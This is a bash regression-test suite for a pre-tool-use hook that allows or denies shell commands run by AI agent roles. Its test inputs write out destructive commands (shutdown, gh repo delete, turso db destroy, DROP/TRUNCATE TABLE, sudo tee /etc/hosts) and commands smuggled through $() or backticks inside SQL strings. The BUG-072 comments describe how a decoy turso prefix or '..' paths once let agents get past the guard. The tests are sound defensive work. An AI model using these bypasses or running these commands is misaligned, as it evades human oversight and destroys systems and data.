t_assert "main thread + gh write → allow (bypass)" "allow" "$_t2d_mt"

# ─────────────────────────────────────────────
# repo-scoped single-writer gate (Track 2d / FEAT-054) — owned-set, multi-repo
# Uses a JUVANT_CONFIG fixture so the gate has a registry to scope against.
# ─────────────────────────────────────────────
suite "repo-scoped gate (Track 2d / FEAT-054)"

RS_CFG="$TMPROOT/repo-scope-config.json"
cat > "$RS_CFG" <<'JSON'
{
  "components": [
    { "slug":"lumen-cli", "maintainer":"lumen-cli-maintainer", "repo":"juvantlabs/lumen-cli",
      "working_tree":"/W/lumen-cli", "additional_working_trees":[] }
  ],
  "projects": {
    "hardys": { "working_tree":"/W/hardys-web", "additional_working_trees":["/W/hardys-api"],
      "github_repos":["juvantlabs/hardys-web","juvantlabs/hardys-api","juvantlabs/hardys-infra"] }
  }
}
JSON
_rs() {  # $1=agent_type $2=command -> decision (with the repo-scope fixture)
  JUVANT_CONFIG="$RS_CFG" jq -nc --arg c "$2" --arg a "$1" \
    '{tool_name:"Bash",session_id:"s",agent_type:$a,tool_input:{command:$c}}' \
    | JUVANT_CONFIG="$RS_CFG" bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null | jq -r '.hookSpecificOutput.permissionDecision'
}
# maintainer (N=1)
t_assert "maintainer + own-tree git push → allow"   "allow" "$(_rs lumen-cli-maintainer 'cd /W/lumen-cli && git push')"
t_assert "maintainer + own-repo gh → allow"         "allow" "$(_rs lumen-cli-maintainer 'gh pr create --repo juvantlabs/lumen-cli')"
t_assert "maintainer + other-repo gh → deny"        "deny"  "$(_rs lumen-cli-maintainer 'gh pr create --repo juvantlabs/other')"
t_assert "maintainer + other-tree git → deny"       "deny"  "$(_rs lumen-cli-maintainer 'cd /W/other && git push')"
t_assert "maintainer + undeterminable → allow (fail-open)" "allow" "$(_rs lumen-cli-maintainer 'git commit -m x')"
# eng-lead, multi-repo project (hardys: N=many)
t_assert "eng-lead + owned repo (api) → allow"      "allow" "$(_rs hardys-eng-lead 'gh pr create --repo juvantlabs/hardys-api')"
t_assert "eng-lead + owned repo (infra) → allow"    "allow" "$(_rs hardys-eng-lead 'gh api repos/juvantlabs/hardys-infra/pulls -X POST')"
t_assert "eng-lead + non-owned repo → deny"         "deny"  "$(_rs hardys-eng-lead 'gh pr create --repo juvantlabs/hardys-mobile')"
t_assert "eng-lead + other-tree git → deny"         "deny"  "$(_rs hardys-eng-lead 'cd /W/elsewhere && git push')"
# E (Track 2d hardening) — the cross-tree redirect via `git -C` must be seen
# as a working-tree target (the prior gate only parsed a leading `cd`).
t_assert "maintainer + git -C /W/other push → deny (cross-tree via -C)"   "deny"  "$(_rs lumen-cli-maintainer 'git -C /W/other push')"
t_assert "maintainer + git -C /W/lumen-cli push → allow (own tree via -C)" "allow" "$(_rs lumen-cli-maintainer 'git -C /W/lumen-cli push')"
# ultrareview #68: -C must OVERRIDE a leading `cd` (git changes its own CWD),
# and a '..' traversal out of the owned tree must be rejected fail-closed.
t_assert "maintainer + cd owned && git -C /W/other push → deny (-C overrides cd)" "deny" "$(_rs lumen-cli-maintainer 'cd /W/lumen-cli && git -C /W/other push')"
t_assert "maintainer + git -C /W/lumen-cli/../other push → deny (.. traversal)"   "deny" "$(_rs lumen-cli-maintainer 'git -C /W/lumen-cli/../other push')"
t_assert "maintainer + cd /W/lumen-cli/../other && git push → deny (.. via cd)"   "deny" "$(_rs lumen-cli-maintainer 'cd /W/lumen-cli/../other && git push')"

# ─────────────────────────────────────────────
# BUG-056 (#143) — Track-2b honors JUVANT_CONFIG (parity with Track 2c/2d/2e)
# ─────────────────────────────────────────────
suite "Track-2b config resolution (BUG-056)"

B56_CFG="$TMPROOT/bug056-config.json"
cat > "$B56_CFG" <<'JSON'
{ "turso_db_name": "company-b56", "turso_url": "libsql://company-b56.turso.io", "projects": {} }
JSON

# A project-scope agent writing to the company DB must be denied by Track-2b §4c.
# The guard can only match the company DB name if it reads JUVANT_CONFIG — with
# the old hardcoded path it read a config without this DB → no match → allow.
# eng-frontend carries turso (BUG-055), so the command clears the allow-list and
# actually reaches Track-2b.
b56_out=$(JUVANT_CONFIG="$B56_CFG" jq -nc \
  --arg c 'turso db shell company-b56 "UPDATE t SET x=1"' --arg a 'dog-ai-eng-frontend' \
  '{tool_name:"Bash",session_id:"s-b56",agent_type:$a,tool_input:{command:$c}}' \
  | JUVANT_CONFIG="$B56_CFG" bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
t_assert "BUG-056: Track-2b reads JUVANT_CONFIG → project→company write denied" "deny" \
  "$(echo "$b56_out" | jq -r '.hookSpecificOutput.permissionDecision')"
case "$(echo "$b56_out" | jq -r '.hookSpecificOutput.permissionDecisionReason')" in
  *"§4c"*) t_assert "BUG-056: denial cites the §4c scope boundary" "ok" "ok" ;;
  *) t_assert "BUG-056: denial cites the §4c scope boundary" "ok" "got other reason" ;;
esac

# ─────────────────────────────────────────────
# ADR 0029 — JUVANT_EXECUTING_SPEC=<id> stamps agent_actions_log.spec_id
# (artifact-less spec-marking signal for the Layer-1 gate)
# ─────────────────────────────────────────────
suite "ADR-0029: JUVANT_EXECUTING_SPEC → spec_id stamp"

t_purge agent_actions_log
rm -f "$JUVANT_SPOOL"
event_json='{"tool_name":"Bash","session_id":"sess-0029","tool_input":{"command":"JUVANT_EXECUTING_SPEC=42 git status"}}'
echo "$event_json" | AGENT_ROLE=cos bash "$HOOKS_DIR/pre-tool-use.sh" >/dev/null 2>&1
bash "$ROOT_DIR/helpers/drain-audit-spool.sh" >/dev/null 2>&1
t_assert "ADR-0029: env-prefix → spec_id=42 on the audit row" "42" \
  "$(t_db "SELECT spec_id FROM agent_actions_log WHERE session_id='sess-0029';")"

# Control: no prefix → spec_id column omitted from the INSERT → NULL (byte-identical
# common path, no migration dependency).
rm -f "$JUVANT_SPOOL"
event_json='{"tool_name":"Bash","session_id":"sess-0029b","tool_input":{"command":"git status"}}'
echo "$event_json" | AGENT_ROLE=cos bash "$HOOKS_DIR/pre-tool-use.sh" >/dev/null 2>&1
bash "$ROOT_DIR/helpers/drain-audit-spool.sh" >/dev/null 2>&1
t_assert "ADR-0029: no prefix → spec_id NULL" "" \
  "$(t_db "SELECT spec_id FROM agent_actions_log WHERE session_id='sess-0029b';")"

# ─────────────────────────────────────────────
# decisions#298 (L1-F2): spooled audit INSERT carries the hook-clock started_at
# ─────────────────────────────────────────────
suite "decisions#298: audit row started_at is action time, not drain time"

t_purge agent_actions_log
rm -f "$JUVANT_SPOOL"
echo '{"tool_name":"Bash","session_id":"sess-298ts","tool_input":{"command":"git status"}}' \
  | AGENT_ROLE=cos bash "$HOOKS_DIR/pre-tool-use.sh" >/dev/null 2>&1
t_assert "spooled INSERT names the started_at column" "1" \
  "$(grep -c "input_summary, started_at" "$JUVANT_SPOOL" 2>/dev/null || echo 0)"
sleep 2   # a drain delay: DB default CURRENT_TIMESTAMP would now be >= 2s later
bash "$ROOT_DIR/helpers/drain-audit-spool.sh" >/dev/null 2>&1
t_assert "row started_at predates the drain (not stamped at drain time)" "1" \
  "$(t_db "SELECT COUNT(*) FROM agent_actions_log WHERE session_id='sess-298ts' AND started_at <= datetime('now','-1 second');")"
t_assert "started_at uses the same UTC format as ended_at" "1" \
  "$(t_db "SELECT COUNT(*) FROM agent_actions_log WHERE session_id='sess-298ts' AND started_at GLOB '[0-9][0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9] [0-9][0-9]:[0-9][0-9]:[0-9][0-9]';")"
# A denied call is stamped too, and the spec_id variant keeps its column order.
rm -f "$JUVANT_SPOOL"
echo '{"tool_name":"Bash","session_id":"sess-298sp","tool_input":{"command":"JUVANT_EXECUTING_SPEC=298 git status"}}' \
  | AGENT_ROLE=cos bash "$HOOKS_DIR/pre-tool-use.sh" >/dev/null 2>&1
bash "$ROOT_DIR/helpers/drain-audit-spool.sh" >/dev/null 2>&1
t_assert "spec_id variant still lands with started_at" "298" \
  "$(t_db "SELECT spec_id FROM agent_actions_log WHERE session_id='sess-298sp' AND started_at IS NOT NULL;")"

# ─────────────────────────────────────────────
# Track 4 — spec gate distinguishes DB-unreachable from no-spec (E)
# ─────────────────────────────────────────────
suite "spec gate (Track 4: DB-unreachable vs no-spec)"

T4_CMD='turso db shell mydb "ALTER TABLE foo ADD COLUMN bar TEXT"'
_t4() {  # $1=db_file_override  -> full hook JSON for eng-platform + a gated db-schema cmd
  jq -nc --arg c "$T4_CMD" '{tool_name:"Bash",session_id:"s-t4",agent_type:"eng-platform",tool_input:{command:$c}}' \
    | JUVANT_TEST_DB_FILE="$1" bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null
}
t_purge decisions
# Reachable, no approved spec → fail-closed with the missing-spec message.
out=$(_t4 "$TEST_DB")
t_assert "no spec → deny" "deny" "$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')"
case "$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecisionReason')" in
  *"None found"*) t_assert "no spec → 'None found' (author a spec)" "ok" "ok" ;;
  *) t_assert "no spec → 'None found' (author a spec)" "ok" "got other msg" ;;
esac
# DB unreachable (bad db file) → still deny, but DISTINCT message (do not author a spec).
out=$(_t4 "/nonexistent/dir/nope.db")
t_assert "DB unreachable → deny" "deny" "$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision')"
case "$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecisionReason')" in
  *"unreachable"*) t_assert "DB unreachable → 'unreachable' (not a missing-spec message)" "ok" "ok" ;;
  *) t_assert "DB unreachable → 'unreachable' (not a missing-spec message)" "ok" "got other msg" ;;
esac
# Approved spec present → allow.
t_db "INSERT INTO decisions (agent,title,category,status,approved_by,approved_at,created_at)
      VALUES ('eng-platform','schema bump','install-spec','approved','ceo',datetime('now'),datetime('now'));"
t_assert "approved spec present → allow" "allow" "$(_t4 "$TEST_DB" | jq -r '.hookSpecificOutput.permissionDecision')"
t_purge decisions

# ─────────────────────────────────────────────
# post-tool-use-failure.sh — ROLE derivation parity (audit plumbing)
# ─────────────────────────────────────────────
# pre-tool-use.sh writes the 'pending' row using the .agent_type from the
# event (the only ROLE a subagent carries). The failure hook must derive
# ROLE the same way, or its UPDATE's match key (session_id, agent,
# tool_name, args_hash) never finds the pending row and the failed call
# stays 'pending' forever. Regression: the hook used `${AGENT_ROLE:-unknown}`
# which ignored .agent_type.
suite "post-tool-use-failure.sh (ROLE parity)"

t_purge agent_actions_log
# Seed a pending row exactly as pre-tool-use would for a subagent whose
# event carries agent_type='cfo' (NOT exported as AGENT_ROLE in the env).
ptf_event='{"session_id":"sess-ptf","tool_name":"Bash","tool_input":{"command":"terraform apply"},"agent_type":"cfo"}'
# Match the hook's fingerprint exactly: jq -c -S of .tool_input, hashed with
# NO trailing newline (printf '%s', not a bare `jq | shasum` which appends one).
ptf_args_json=$(echo "$ptf_event" | jq -c -S '.tool_input // {}')
ptf_args_hash=$(printf '%s' "$ptf_args_json" | shasum -a 256 | awk '{print $1}')
t_db "INSERT INTO agent_actions_log (session_id, agent, tool_name, args_hash, status, started_at)
      VALUES ('sess-ptf','cfo','Bash','$ptf_args_hash','pending', datetime('now'));"
# Fire the failure hook with AGENT_ROLE unset — ROLE must come from .agent_type.
echo "$ptf_event" | env -u AGENT_ROLE bash "$HOOKS_DIR/post-tool-use-failure.sh" >/dev/null 2>&1
ptf_status=$(t_db "SELECT status FROM agent_actions_log WHERE session_id='sess-ptf';")
t_assert "failure hook reads .agent_type → pending row finalized to 'failure'" "failure" "$ptf_status"

# ─────────────────────────────────────────────
# pre-compact.sh → post-compact.sh — snapshot round-trip (multi-line)
# ─────────────────────────────────────────────
# A snapshot is multi-line free text with spaces; the old reader truncated
# it (`tail -n 1`) and the turso scalar query strips all whitespace. base64
# storage makes it survive both. Round-trip an awkward snapshot and assert
# byte-for-byte identity.
suite "pre/post-compact.sh (snapshot round-trip)"

t_db "DELETE FROM session_snapshots WHERE agent='snaptest';"
snap=$'line one with spaces\nline two, with a comma\nit'\''s got an apostrophe\n  indented trailing line'
printf '%s' "$snap" | AGENT_ROLE=snaptest bash "$HOOKS_DIR/pre-compact.sh" >/dev/null 2>&1
restored=$(AGENT_ROLE=snaptest bash "$HOOKS_DIR/post-compact.sh" 2>/dev/null)
t_assert "multi-line snapshot survives the store→restore round-trip" "$snap" "$restored"
stored=$(t_db "SELECT snapshot FROM session_snapshots WHERE agent='snaptest' ORDER BY created_at DESC LIMIT 1;")
# base64 is a single line ⇒ zero embedded newlines. A regressed raw multi-line
# store would report >0 here.
t_assert "snapshot is stored single-line (base64 ⇒ zero embedded newlines)" "0" \
  "$(printf '%s' "$stored" | wc -l | tr -d ' ')"

# ─────────────────────────────────────────────
# drain-audit-spool.sh — partial failure does not duplicate (audit plumbing)
# ─────────────────────────────────────────────
# A spool whose middle statement fails must apply the head exactly once and
# re-queue only the unapplied tail. The old whole-batch re-queue re-applied
# the already-committed head on the next run, duplicating audit rows.
suite "drain-audit-spool.sh (no dup on partial failure)"

# Spooled statements use real writer shapes (decisions#303 R3: the drain only
# executes allowlisted shapes). The failing middle statement is an allowlisted
# shape the DB rejects: a 'denied' row with an empty input_summary trips the
# action_log_denied_requires_summary trigger.
_dt_row() { # status summary
  printf "INSERT INTO agent_actions_log (session_id, agent, tool_name, args_hash, status, deny_reason, input_summary, started_at) VALUES ('drain-t', 'cos', 'Bash', 'h', '%s', 'r', '%s', '2026-10-28 10:00:00');" "$1" "$2"
}
t_db "DELETE FROM agent_actions_log WHERE session_id='drain-t';"
rm -f "$JUVANT_SPOOL"
{
  _dt_row pending one; echo
  _dt_row denied "";   echo
  _dt_row pending three; echo
} > "$JUVANT_SPOOL"
bash "$ROOT_DIR/helpers/drain-audit-spool.sh" >/dev/null 2>&1
t_assert "partial drain applies only the head (1 row, not 2)" "1" \
  "$(t_db "SELECT COUNT(*) FROM agent_actions_log WHERE session_id='drain-t';")"
t_assert "partial drain re-queues the unapplied tail (2 lines)" "2" \
  "$([[ -f "$JUVANT_SPOOL" ]] && grep -c . "$JUVANT_SPOOL" || echo 0)"
# Repair the failing statement and drain again — the head must NOT re-apply.
{ _dt_row pending three; echo; } > "$JUVANT_SPOOL"
bash "$ROOT_DIR/helpers/drain-audit-spool.sh" >/dev/null 2>&1
t_assert "second drain adds the tail without duplicating the head (2 rows total)" "2" \
  "$(t_db "SELECT COUNT(*) FROM agent_actions_log WHERE session_id='drain-t';")"
t_assert "'one' was applied exactly once across both drains" "1" \
  "$(t_db "SELECT COUNT(*) FROM agent_actions_log WHERE session_id='drain-t' AND input_summary='one';")"

# ─────────────────────────────────────────────
# drain-audit-spool.sh — BUG-052 orphaned-pending reconcile
# ─────────────────────────────────────────────
# Async / fire-and-forget tools (SendMessage, ExitPlanMode) get no synchronous
# PostToolUse, so post-tool-use.sh never finalizes their 'pending' audit row;
# spool tail-loss on SIGKILL does the same. After a successful drain — the one
# point where every spooled INSERT/UPDATE is in the DB — the drainer sweeps
# 'pending' rows older than 1h to 'terminated'. A recent (in-flight) pending
# row and any already-finalized row must be left untouched.
suite "drain-audit-spool.sh (BUG-052 orphaned-pending reconcile)"

t_purge agent_actions_log
# old orphan (2h): async tool whose PostToolUse never fired
t_db "INSERT INTO agent_actions_log (session_id,agent,tool_name,args_hash,status,started_at)
      VALUES ('s-old','cos','SendMessage','h1','pending', datetime('now','-2 hours'));"
# recent pending (5 min): a genuinely in-flight action — must stay pending
t_db "INSERT INTO agent_actions_log (session_id,agent,tool_name,args_hash,status,started_at)
      VALUES ('s-live','cos','Bash','h2','pending', datetime('now','-5 minutes'));"
# already-finalized success (2h): must stay success
t_db "INSERT INTO agent_actions_log (session_id,agent,tool_name,args_hash,status,started_at,ended_at)
      VALUES ('s-done','cto','Read','h3','success', datetime('now','-2 hours'), datetime('now','-2 hours'));"

rm -f "$JUVANT_SPOOL"
# non-empty spool with a valid (allowlisted, decisions#303 R3) statement so the
# drain reaches the reconcile block
echo "UPDATE agents SET status='active', updated_at='2026-10-28 10:00:00' WHERE role='drain-r';" > "$JUVANT_SPOOL"
bash "$ROOT_DIR/helpers/drain-audit-spool.sh" >/dev/null 2>&1

t_assert "BUG-052: old orphan pending → terminated" "terminated" \
  "$(t_db "SELECT status FROM agent_actions_log WHERE session_id='s-old';")"
t_assert "BUG-052: terminated row gets ended_at" "true" \
  "$([[ -n "$(t_db "SELECT ended_at FROM agent_actions_log WHERE session_id='s-old';")" ]] && echo true || echo false)"
t_assert "BUG-052: recent in-flight pending untouched" "pending" \
  "$(t_db "SELECT status FROM agent_actions_log WHERE session_id='s-live';")"
t_assert "BUG-052: finalized success untouched" "success" \
  "$(t_db "SELECT status FROM agent_actions_log WHERE session_id='s-done';")"

# ─────────────────────────────────────────────
# BUG-066 / decisions#272 — turso SQL payload false-positive denials
#
# Root cause: universal deny_patterns and Track 2d write-detection matched
# the ENTIRE command string, including SQL string literals passed as arguments
# to `turso db shell`. Prose inside rationale/VALUES columns that happened to
# mention shell binary names (shutdown, reboot, halt), git write verbs
# (commit, push, merge), or SQL DDL keywords (TRUNCATE TABLE, DROP TABLE)
# triggered the deny even though no actual lifecycle/write/DDL action was
# being attempted.
#
# Fix: when FIRST_TOKEN is `turso` and the invocation is `db shell` / `db exec`,
# skip universal deny_patterns and Track 2d write-detection; check the extracted
# SQL payload against sql_deny_patterns (anchored DDL patterns) instead.
#
# Test layout:
#   False-positive regressions (a)-(c): these were denied before, must ALLOW.
#   True-positive confirmations (d)-(g): legitimate denials must still DENY.
# ─────────────────────────────────────────────
suite "BUG-066: turso SQL payload false-positive denials (decisions#272)"

t_seed_agent "eng-platform" "active"

_bug066() {  # $1=command -> decision
  jq -nc --arg c "$1" --arg a "eng-platform" \
    '{tool_name:"Bash",session_id:"sess-b66",agent_type:$a,tool_input:{command:$c}}' \
    | bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null | jq -r '.hookSpecificOutput.permissionDecision'
}

# ── False-positive regressions (should ALLOW after fix) ──────────────────

# (a) INSERT where the rationale column mentions the power-off binary in prose.
#     Before fix: universal deny_patterns matched "shutdown" inside the VALUES string.
t_assert "BUG-066 (a): INSERT with 'shutdown' in prose column → allow" "allow" \
  "$(_bug066 'turso db shell company-juvant "INSERT INTO decisions (agent,title,rationale) VALUES ('"'"'eng-platform'"'"','"'"'runbook'"'"','"'"'the shutdown procedure requires a maintenance window'"'"')"')"

# (b) INSERT where the rationale describes a git write flow.
#     Before fix: Track 2d matched "git commit" in the VALUES string.
t_assert "BUG-066 (b): INSERT with 'git commit' in prose column → allow" "allow" \
  "$(_bug066 'turso db shell company-juvant "INSERT INTO decisions (rationale) VALUES ('"'"'fix: git commit the upstream changes to main'"'"')"')"

# (c) INSERT where the rationale mentions a DDL keyword.
#     Before fix: deny_patterns matched "TRUNCATE TABLE" inside the VALUES string.
t_assert "BUG-066 (c): INSERT with TRUNCATE TABLE in prose column → allow" "allow" \
  "$(_bug066 'turso db shell company-juvant "INSERT INTO decisions (rationale) VALUES ('"'"'we TRUNCATE TABLE sessions in the nightly runbook'"'"')"')"

# ── True-positive confirmations (must still DENY after fix) ──────────────

# (d) Direct DDL against turso: payload begins with DROP TABLE → sql_deny_patterns.
t_assert "BUG-066 (d): turso db shell DROP TABLE → deny (sql_deny_patterns)" "deny" \
  "$(_bug066 'turso db shell company-juvant "DROP TABLE users"')"

# (e) Direct TRUNCATE: payload begins with TRUNCATE TABLE → sql_deny_patterns.
t_assert "BUG-066 (e): turso db shell TRUNCATE TABLE → deny (sql_deny_patterns)" "deny" \
  "$(_bug066 'turso db shell company-juvant "TRUNCATE TABLE sessions"')"

# (f) Direct invocation of the power-off binary as the FIRST_TOKEN (non-turso):
#     the deny_patterns still fire when shutdown is an actual shell command.
#     Invoked as main-thread (no agent_type) so the allow-list is bypassed; the
#     universal deny fires first regardless of role.
shutdown_event='{"tool_name":"Bash","session_id":"sess-b66f","tool_input":{"command":"shutdown now"}}'
out_f=$(echo "$shutdown_event" | bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
t_assert "BUG-066 (f): shutdown as FIRST_TOKEN → deny (deny_patterns still fires)" "deny" \
  "$(echo "$out_f" | jq -r '.hookSpecificOutput.permissionDecision')"

# (g) Lifecycle binary at a non-first position in a compound shell command.
#     COMMAND = `echo "test" && shutdown -h now`  (not a turso SQL invocation).
#     deny_patterns apply full-string and catch "shutdown" after && .
shutdown_cpd_event='{"tool_name":"Bash","session_id":"sess-b66g","tool_input":{"command":"echo \"test\" && shutdown -h now"}}'
out_g=$(echo "$shutdown_cpd_event" | bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
t_assert "BUG-066 (g): shutdown in compound cmd (non-turso) → deny (full-string deny_patterns)" "deny" \
  "$(echo "$out_g" | jq -r '.hookSpecificOutput.permissionDecision')"

# (h) Inline env-prefix turso invocation with a prose INSERT (BUG-054 + BUG-066 combined).
#     TURSO_DATABASE_URL=libsql://x.turso.io turso db shell … "INSERT … 'shutdown…'"
t_assert "BUG-066 (h): env-prefix turso + shutdown in prose → allow (env-prefix FIRST_TOKEN detection)" "allow" \
  "$(_bug066 'TURSO_DATABASE_URL=libsql://x.turso.io turso db shell company-juvant "INSERT INTO decisions (rationale) VALUES ('"'"'the shutdown procedure'"'"')"')"

# ── Under-deny bypasses closed (review hardening of decisions#272) ───────
# The original single-`^`-anchor sql_deny_patterns missed (1) statement-stacking
# and (2) the scope='global' escalation rule (which lives in deny_patterns, the
# loop skipped in turso mode). These MUST deny, and via the sql-deny path
# (reason prefix `turso:sql`) — NOT incidentally via the Track-4 spec gate. The
# isolating cases therefore use verbs Track 4 does not full-string match
# (TRUNCATE, DROP USER) plus the scope rule.
_bug066r() {  # $1=command -> "decision|reason"
  local o; o=$(jq -nc --arg c "$1" --arg a "eng-platform" \
    '{tool_name:"Bash",session_id:"sess-b66r",agent_type:$a,tool_input:{command:$c}}' \
    | bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
  printf '%s|%s' "$(echo "$o" | jq -r '.hookSpecificOutput.permissionDecision')" \
                 "$(echo "$o" | jq -r '.hookSpecificOutput.permissionDecisionReason')"
}
_via_sql() { case "$1" in turso:sql*) echo ok ;; *) echo "got: $1" ;; esac; }

# (i) statement-stacked TRUNCATE — Track 4 does not match TRUNCATE, so a deny
#     here proves the per-statement sql-deny path fired (not the spec gate).
_r=$(_bug066r 'turso db shell company-juvant "SELECT 1; TRUNCATE TABLE sessions"')
t_assert "BUG-066 (i): stacked TRUNCATE → deny"        "deny" "${_r%%|*}"
t_assert "BUG-066 (i): denied via sql-deny path"       "ok"   "$(_via_sql "${_r#*|}")"

# (j) statement-stacked DROP USER — Track 4 matches only DROP TABLE/DATABASE.
_r=$(_bug066r 'turso db shell company-juvant "SELECT 1; DROP USER admin"')
t_assert "BUG-066 (j): stacked DROP USER → deny"       "deny" "${_r%%|*}"
t_assert "BUG-066 (j): denied via sql-deny path"       "ok"   "$(_via_sql "${_r#*|}")"

# (k) scope='global' escalation via turso — the rule lost in turso mode pre-fix.
_r=$(_bug066r 'turso db shell company-juvant "UPDATE decisions SET scope='"'"'global'"'"' WHERE id=1"')
t_assert "BUG-066 (k): UPDATE scope=global → deny"     "deny" "${_r%%|*}"
t_assert "BUG-066 (k): denied via sql-deny path"       "ok"   "$(_via_sql "${_r#*|}")"

# (l) stacked scope='global' after a benign leading statement (per-statement).
_r=$(_bug066r 'turso db shell company-juvant "SELECT 1; UPDATE decisions SET scope='"'"'global'"'"' WHERE id=2"')
t_assert "BUG-066 (l): stacked scope=global → deny"    "deny" "${_r%%|*}"
t_assert "BUG-066 (l): denied via sql-deny path"       "ok"   "$(_via_sql "${_r#*|}")"

# ─────────────────────────────────────────────
# BUG-072 — turso SQL mode disarms guardrails it was never meant to reach
#
# decisions#272 (BUG-066) introduced _TURSO_SQL_MODE: when the command is a
# `turso db shell|exec` invocation, skip the universal deny_patterns and the
# Track 2d single-writer gate, and check the extracted SQL payload against
# sql_deny_patterns instead. The exemption was correct in intent and wrong in
# extent, on two independent surfaces.
#
#   ACTIVATION. The test was "first token is turso" AND "the string contains
#   `turso db shell|exec `" — the second matching ANYWHERE. Both hold for a
#   compound command whose turso half is a decoy, so an eight-character prefix
#   disarmed the ENTIRE universal deny-list and the §4 single-writer gate, for
#   every role — and `turso` is allow-listed for every agent, because it is the
#   DB write path. Fix: activate only for a single simple command (no shell
#   control operator outside quotes), head-anchored.
#
#   EXTRACTION. The payload sed could not see a QUOTED db argument (its class
#   excluded `"`, so it returned the string unchanged and the payload became
#   the whole command), stripped only enclosing DOUBLE quotes from the SQL, and
#   used a greedy `.*` that consumed up to the LAST `turso db shell ` in the
#   string. Each defeats the `^`-anchored sql_deny_patterns; the greedy one
#   defeats even the position-independent scope='global' rule. Fix: a
#   head-anchored match that understands a quoted db argument, and which FAILS
#   CLOSED — no identifiable invocation head, no exemption.
#
# Every assertion below is red against the pre-fix hook.
# ─────────────────────────────────────────────
suite "BUG-072: turso SQL mode over-reach (activation + extraction)"

t_reset_agents
t_seed_agent "eng-platform" "active"
t_seed_agent "cto" "active"

_b72() {  # $1=command [$2=role] -> "decision|reason"
  local o; o=$(jq -nc --arg c "$1" --arg a "${2:-eng-platform}" \
    '{tool_name:"Bash",session_id:"sess-b72",agent_type:$a,tool_input:{command:$c}}' \
    | bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null)
  printf '%s|%s' "$(echo "$o" | jq -r '.hookSpecificOutput.permissionDecision')" \
                 "$(echo "$o" | jq -r '.hookSpecificOutput.permissionDecisionReason' | tr '\n' ' ')"
}
# Path discriminators: a deny is only meaningful if it came from the layer
# under test, not incidentally from the Track-4 spec gate.
_via_universal() { case "$1" in "universal deny-list"*) echo ok ;; *) echo "got: ${1:0:46}" ;; esac; }
_via_writer()    { case "$1" in "SINGLE-WRITER"*)       echo ok ;; *) echo "got: ${1:0:46}" ;; esac; }
_via_sqldeny()   { case "$1" in turso:sql*)             echo ok ;; *) echo "got: ${1:0:46}" ;; esac; }

# ── Activation: a compound command is not a turso invocation ─────────────
# The turso half is identical and harmless in every case; only the tail differs.
_B72_HEAD='turso db shell company-juvant "SELECT 1"'

_r=$(_b72 "$_B72_HEAD"' && sudo systemctl stop nginx')
t_assert "BUG-072 (a): turso && sudo → deny"            "deny" "${_r%%|*}"
t_assert "BUG-072 (a): via universal deny-list"         "ok"   "$(_via_universal "${_r#*|}")"

_r=$(_b72 "$_B72_HEAD"' && gh repo delete juvantlabs/juvant-os --yes')
t_assert "BUG-072 (b): turso && gh repo delete → deny"  "deny" "${_r%%|*}"
t_assert "BUG-072 (b): via universal deny-list"         "ok"   "$(_via_universal "${_r#*|}")"

# The tail is itself a turso destructive verb — turso mode was shielding it.
_r=$(_b72 "$_B72_HEAD"' && turso db destroy company-juvant')
t_assert "BUG-072 (c): turso && turso db destroy → deny" "deny" "${_r%%|*}"
t_assert "BUG-072 (c): via universal deny-list"          "ok"  "$(_via_universal "${_r#*|}")"

_r=$(_b72 "$_B72_HEAD"' | sudo tee /etc/hosts')
t_assert "BUG-072 (d): turso | sudo tee → deny"         "deny" "${_r%%|*}"
t_assert "BUG-072 (d): via universal deny-list"         "ok"   "$(_via_universal "${_r#*|}")"

_r=$(_b72 "$_B72_HEAD"' ; shutdown -h now')
t_assert "BUG-072 (e): turso ; shutdown → deny"         "deny" "${_r%%|*}"
t_assert "BUG-072 (e): via universal deny-list"         "ok"   "$(_via_universal "${_r#*|}")"

# Newline is a command separator exactly like `;`.
_r=$(_b72 "$_B72_HEAD"'
sudo systemctl stop nginx')
t_assert "BUG-072 (f): turso NEWLINE sudo → deny"       "deny" "${_r%%|*}"
t_assert "BUG-072 (f): via universal deny-list"         "ok"   "$(_via_universal "${_r#*|}")"

# Command substitution is live inside double quotes — the scanner must see it
# even though it sits within the SQL string.
_r=$(_b72 'turso db shell company-juvant "SELECT '"'"'$(gh repo delete juvantlabs/juvant-os --yes)'"'"'"')
t_assert "BUG-072 (g): \$( ) inside dquoted SQL → deny" "deny" "${_r%%|*}"
t_assert "BUG-072 (g): via universal deny-list"         "ok"   "$(_via_universal "${_r#*|}")"

_r=$(_b72 'turso db shell company-juvant "SELECT '"'"'`gh repo delete juvantlabs/juvant-os --yes`'"'"'"')
t_assert "BUG-072 (h): backtick inside dquoted SQL → deny" "deny" "${_r%%|*}"
t_assert "BUG-072 (h): via universal deny-list"            "ok" "$(_via_universal "${_r#*|}")"

# Track 2d: the §4 single-writer gate was skipped in turso mode too. `cto` is
# GitHub-read-only, so a bare `git push` / `gh pr merge` denies; the turso
# prefix must not change that.
_r=$(_b72 "$_B72_HEAD"' && git push origin main' cto)
t_assert "BUG-072 (i): turso && git push (cto) → deny"  "deny" "${_r%%|*}"
t_assert "BUG-072 (i): via SINGLE-WRITER §4 gate"       "ok"   "$(_via_writer "${_r#*|}")"

_r=$(_b72 "$_B72_HEAD"' && gh pr merge 1 --squash' cto)
t_assert "BUG-072 (j): turso && gh pr merge (cto) → deny" "deny" "${_r%%|*}"
t_assert "BUG-072 (j): via SINGLE-WRITER §4 gate"         "ok"  "$(_via_writer "${_r#*|}")"

# ── Extraction: single, exclusively-turso commands ───────────────────────
# Each of these IS a legitimate turso invocation; the exemption applies, and
# sql_deny_patterns must actually see the SQL. TRUNCATE and scope='global' are
# used as probes because Track 4 does not full-string match them — so a deny
# here can only have come from the sql-deny path.

# Quoted DB argument — the form JUVANT_OS.md documents.
_r=$(_b72 'turso db shell "libsql://x.turso.io" "TRUNCATE TABLE sessions"')
t_assert "BUG-072 (k): quoted db arg + TRUNCATE → deny" "deny" "${_r%%|*}"
